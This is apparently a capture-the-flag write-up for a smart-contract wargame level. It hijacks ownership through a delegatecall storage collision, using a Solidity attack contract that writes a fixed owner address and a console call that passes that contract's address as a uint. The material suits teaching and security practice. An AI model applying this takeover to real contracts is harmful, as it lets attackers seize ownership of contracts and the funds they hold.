## Description
Obtain the address in uint using getUintAddress to pass this number as the address of a contract that will be overwritten in storage due to delegatecall in slot 0 and then be a callable contract. 
```
await contract.setFirstTime('1081877567106236786885070956901106239420211629883')
```
```
contract Attack{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
        owner = 0x8c5E11D36C3b42d258eB2DDB493e00A6d041fB69;
    }

    function getUintAddress(address addr) public pure returns(uint256){
        return uint256(uint160(addr));
    }
}
```
```
await contract.setFirstTime('1081877567106236786885070956901106239420211629883')
```